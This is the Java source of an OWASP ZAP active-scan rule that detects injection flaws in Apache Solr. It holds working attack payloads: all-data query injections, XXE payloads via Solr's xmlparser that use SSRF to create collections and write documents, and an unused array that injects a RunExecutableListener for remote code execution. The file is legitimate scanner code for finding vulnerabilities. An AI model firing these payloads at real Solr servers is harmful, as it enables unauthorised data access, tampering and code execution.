package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.net.SocketException;

import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.model.Tech;

import net.sf.json.JSONException;

public class SolrInjection extends AbstractAppParamPlugin {

	private static final Tech SOLR_TECH = Tech.Db /* Tech.Solr */;
	private static final String MESSAGE_PREFIX = "ascanalpha.solrnosqlinjection.";
	private static final String ALL_DATA_ATTACK = "alldata";
	private static final String XXE_ATTACK = "xxe";
	//private static final String CODE_EXECUTION_ATTACK ="codeexecution";
	private static final String INJECTED_COLLECTION = "collectioninjected";
	private static final String DEFAULT_COLLECTION = "gettingstarted";
	private static final String INJECTED_LISTENER = "injectedlistener";
	private static final String TOKEN_UNKOWN_HOST = "http://_z<>a<>p<>";

	private static final String[] ALL_DATA_INJECTION = { "*", "[* TO *]", "(1 OR *)"};

	private static final String[] XXE_INJECTION = { 
		"{!xmlparser v=\'<!DOCTYPE a SYSTEM \""+TOKEN_UNKOWN_HOST+"\"><a></a>\'}",
		//create a new collection
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/admin/collections?action=CREATE&name="+
		INJECTED_COLLECTION+"&numShards=2\"><a></a>'}",
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/update?stream.body="
		+ "[{\"id\":\"AAA\"}]&commit=true&overwrite=true\"><a></a>'}"		
	};
	
	 static final String[] CODE_EXECUTION_INJECTION = {
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+INJECTED_COLLECTION+"/select?q=xxx&qt=/solr/"
		+INJECTED_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\"}}&shards=localhost:8983/\"><a></a>'}",
		
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/select?q=xxx&qt=/solr/"
		+DEFAULT_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"\"}}&shards=localhost:8983/\"><a>"
		+ "</a>'}"
	};
	
	private static final String[] XXE_ERROR_STRING = {
		"The markup declarations contained or pointed to by the document type declaration must be well-formed.",
		"Error parsing XML stream:java.net.UnknownHostException", 
		"Error parsing XML stream:java.net.ConnectException: Connection refused"
	};

	/*
	 * maybe it is still possible to view if the code executable class it can be used or less.
	private static final String[] CODE_EXECUTION_ERROR_STRING = {   };
	*/
	
	private static final Logger LOG = Logger.getLogger(SolrInjection.class);

		@Override
		public int getId() {
			return 40034;
		}
		
		@Override
		public int getCweId() {
			return 943;
		}

		@Override
		public int getWascId() {
			return 19;
		}
		
		@Override
		public String getName() {
			return Constant.messages.getString(MESSAGE_PREFIX + "name.");
		}

		@Override
		public String getDescription() {
			return Constant.messages.getString(MESSAGE_PREFIX + "desc.");
		}

		@Override
		public int getCategory() {
			return Category.INJECTION;
		}

		@Override
		public String getSolution() {
			return Constant.messages.getString(MESSAGE_PREFIX + "soln.");
		}

		@Override
		public String getReference() {
			return Constant.messages.getString(MESSAGE_PREFIX + "refs.");
		}
		
		@Override
		public String[] getDependency() {
			return new String[] {};
		}
		
		public String getExtraInfo(String attack) {
			return Constant.messages.getString(MESSAGE_PREFIX + "extrainfo." + attack);
		}

		@Override
		public void scan(HttpMessage msg, String param, String value) {
			String[] empty = {};
			try {
				if(inScope(SOLR_TECH)){
					allDataInjectionScan(msg, param, value);
					xxeInjectionScan(msg, param, value);
					//codeExecutitonInjectionScan(msg, param, value);
					}
				
			} catch (SocketException ex) {
				if (LOG.isDebugEnabled()) {
					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() + 
							" when accessing: " + msg.getRequestHeader().getURI().toString());
				}
			} catch(JSONException ex) {
				if (LOG.isDebugEnabled()) {
					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() + 
							" when try to convert the payload in the json format");
				}
			} catch(IOException ex) {
				if (LOG.isDebugEnabled()) {
					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() + 
							" when try to convert the payload in the json format");
				}
			}
		}
		
		private void allDataInjectionScan(HttpMessage msg, String param, String value) throws IOException{
			HttpMessage injectedMsg;
			for(String injectedValue : ALL_DATA_INJECTION) {
				if(isStop()) {
					return;
				}
				injectedMsg = sendInjectedMsg(param, injectedValue);
				if(isBaseBingo(msg, param, value, injectedValue, injectedMsg, msg.getResponseBody().toString(),
						injectedMsg.getResponseBody().toString(), ALL_DATA_ATTACK)) {
					return;
				}
			}
		}

		private void xxeInjectionScan(HttpMessage msg, String param, String value) throws IOException{
			HttpMessage injectedMsg;
			for(String injectedValue : XXE_INJECTION) {
				if(isStop()) {
					return;
				}
				injectedMsg = sendInjectedMsg(param, injectedValue);
				
				if(isSpecificBingo(msg, param, injectedValue, injectedMsg, XXE_ERROR_STRING,  
						injectedMsg.getResponseBody().toString(), XXE_ATTACK)) {
					return;
				}
				isBaseBingo(msg, param, value, injectedValue, injectedMsg, msg.getResponseBody().toString(),
						injectedMsg.getResponseBody().toString(), ALL_DATA_ATTACK);
			}
		}
		/*
		private void codeExecutitonInjectionScan(HttpMessage msg, String param, String value) throws IOException{
			HttpMessage injectedMsg;
		
			//2 times
			injectedMsg = sendInjectedMsg(param, CODE_EXECUTION_INJECTION);
			injectedMsg = sendInjectedMsg(param, CODE_EXECUTION_INJECTION);
			if(isSpecificBingo(msg, param, CODE_EXECUTION_INJECTION, injectedMsg, CODE_EXECUTION_ERROR_STRING, 
					injectedMsg.getResponseBody().toString(), CODE_EXECUTION_ATTACK))
				return;
			isBaseBingo(msg, param, value, CODE_EXECUTION_INJECTION, injectedMsg, msg.getResponseBody().toString(), 
					injectedMsg.getResponseBody().toString(), CODE_EXECUTION_ATTACK);
		}
		*/
		private boolean isBaseBingo(HttpMessage msg, String param, String value, String injectedValue, 
				HttpMessage injectedMsg, String textBase, String textInjected, String attackType) {
			if(!textBase.equals(textInjected)) {

				if(differingOnlyPassedValue(textBase, textInjected, value, injectedValue)) {
					bingo(Alert.RISK_LOW, Alert.CONFIDENCE_LOW, getName(), getDescription(), null, param, 
							injectedValue, "", getSolution(), injectedMsg);
				}
				else {											
					bingo(Alert.RISK_MEDIUM, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param, 
							injectedValue, getExtraInfo(ALL_DATA_ATTACK), getSolution(), injectedMsg);
				}
				return true;
			}
			return false;
		}
		
		private boolean isSpecificBingo(HttpMessage msg, String param, String injectedValue, 
				HttpMessage injectedMsg, String[] specificMatching, String textInjected, String attackType) {
			
			for(String m:specificMatching) {
				if(textInjected.contains(m)) {
					bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
							injectedValue, "", getSolution(), injectedMsg);
					return true;
				}
			}
			return false;
		}
		
		private HttpMessage sendInjectedMsg(String param, String value) throws IOException {
			HttpMessage newMsg = getNewMsg();
			setParameter(newMsg, param, value);
			sendAndReceive(newMsg);
			return newMsg;
		}		
		
		/**
		 * Checks if the @originalMsg and @injectedMsg bodies differ only for the value passed as input.
		 * 
		 * @param originalMsg
		 * @param injectedMsg
		 * @param valueInj
		 * @return true if the @originalMsg body isn't the same of the {@injectedMsg} one, false otherwise.
		 * 
		 */
		private static boolean differingOnlyPassedValue(String originalMsg, String injectedMsg, String valueBase,
				String valueInj) {

			int lengthBase = originalMsg.length();
			int lengthInjected = injectedMsg.length();
			int lengthValueBase = valueBase.length();
			int lengthValueInj = valueInj.length();
			
			if(lengthBase-lengthInjected!=lengthValueBase-lengthValueInj) {
				return false;
			}
			char cursOriginal, cursInjected;
			String extractString;	
			
			for(int index=0; index<lengthInjected; index++) {
				cursOriginal = originalMsg.charAt(index);
				cursInjected = injectedMsg.charAt(index);
				if(cursInjected!=cursOriginal) {
					extractString = injectedMsg.substring(index, index+lengthValueInj);
					if(extractString.equals(valueInj))
						return true;
					else return false;
				}
			}
			return false;
		}
}